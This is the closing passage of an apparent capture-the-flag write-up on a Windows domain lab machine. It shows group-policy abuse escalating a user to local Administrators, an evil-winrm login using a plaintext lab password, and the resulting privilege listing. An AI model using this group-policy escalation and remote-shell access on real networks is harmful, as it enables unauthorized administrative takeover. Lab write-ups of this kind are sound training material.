[!] Group Memberships are already defined in the GPO. Use --force to make changes. This option might break the affected systems!
[-] Exiting...

```

Now let's update the group policy with `gpupdate /force`

If we check our user we see he's part of administrators.

```terminal
*Evil-WinRM* PS C:\Users\HHogan\Documents> net user hhogan
User name                    HHogan
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/29/2025 2:11:56 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.

```

Now let's get another winrm session to get the full administrator privileges.

```terminal
[★]$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'

*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami /priv                                                                                                                                       

PRIVILEGES INFORMATION
---------------------

Privilege Name                            Description                                                        State                                                                            
========================================= ================================================================== =======                                                                          
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled                                                                          
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled                                                                          
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled                                                                          
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled                   
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled                                                                          
SeSystemProfilePrivilege                  Profile system performance                                         Enabled                                                                          
SeSystemtimePrivilege                     Change the system time                                             Enabled                                                                          
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled                                                                          
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

## **References**

<https://web.archive.org/web/20230608022006/https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
